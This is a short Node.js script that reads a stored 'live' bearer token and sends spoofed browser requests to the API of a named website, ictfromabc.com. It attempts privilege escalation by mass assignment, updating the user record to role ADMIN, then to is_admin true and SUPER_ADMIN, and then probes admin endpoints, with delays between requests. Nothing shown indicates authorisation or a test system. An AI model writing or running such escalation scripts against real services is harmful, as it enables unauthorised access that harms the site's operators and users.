import fs from 'fs';
const T=JSON.parse(fs.readFileSync('analysis/_live_token.json','utf8')).token;
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const B='https://ictfromabc.com/api';
const H={'Accept':'application/json','Content-Type':'application/json','User-Agent':UA,Origin:'https://ictfromabc.com',Referer:'https://ictfromabc.com/dashboard/profile',Authorization:'Bearer '+T};
async function call(method,path,body){const r=await fetch(B+path,{method,headers:H,body:body?JSON.stringify(body):undefined,redirect:'manual'});const t=await r.text();return {s:r.status,b:t.slice(0,400)};}
console.log('GET user',JSON.stringify(await call('GET','/user')));
console.log('\nPUT role ADMIN',JSON.stringify(await call('PUT','/user',{role:'ADMIN'})));
await new Promise(r=>setTimeout(r,1100));
console.log('\nGET user2',JSON.stringify(await call('GET','/user')));
await new Promise(r=>setTimeout(r,1100));
console.log('\nGET admin/courses',JSON.stringify(await call('GET','/admin/courses')));
await new Promise(r=>setTimeout(r,1100));
console.log('\nPUT is_admin',JSON.stringify(await call('PUT','/user',{is_admin:true,admin_role_id:1,role:'SUPER_ADMIN'})));
await new Promise(r=>setTimeout(r,1100));
console.log('\nGET admin/user',JSON.stringify(await call('GET','/admin/user')));
